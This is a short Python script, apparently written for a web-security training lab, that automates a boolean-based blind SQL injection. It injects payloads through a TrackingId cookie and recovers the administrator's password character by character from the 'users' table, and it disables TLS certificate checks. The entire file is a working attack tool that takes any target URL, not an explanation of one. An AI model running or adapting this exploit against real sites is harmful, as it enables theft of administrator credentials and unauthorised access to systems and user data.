import sys
import requests
import urllib
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http':'http://127.0.0.1:8080','https':'http://127.0.0.1:8080'}



def sqli_password(url, tracking_cookie):
    password_extracted = ""
    for i in range(1,21):
        for j in range(32,126):
            sql_payload = f"' and (select ascii(substring(password,{i},1)) from users where username='administrator') = '{j}'--'"
            sql_payload_encoded = urllib.parse.quote(sql_payload)
            cookies = {'TrackingId': tracking_cookie +sql_payload_encoded}
            r = requests.get(url, cookies=cookies, verify=False, proxies=proxies)
            if "Welcome" not in r.text:
                sys.stdout.write('\r'+password_extracted + chr(j))
                sys.stdout.flush()
            else:
                password_extracted += chr(j)
                sys.stdout.write('\r'+ password_extracted)
                sys.stdout.flush()
                break




def main():
    if len(sys.argv) !=3:
        print(f"Usage: {sys.argv[0]} <url> <tracking_cookie>")
        print(f"Example: {sys.argv[0]} www.example.com 'UCyysbXHymZ4Nxbb'")

    url = sys.argv[1].strip()
    tracking_cookie = sys.argv[2].strip()
    print("Retrieving administrator password.")
    sqli_password(url, tracking_cookie)


if __name__ == "__main__":
    main()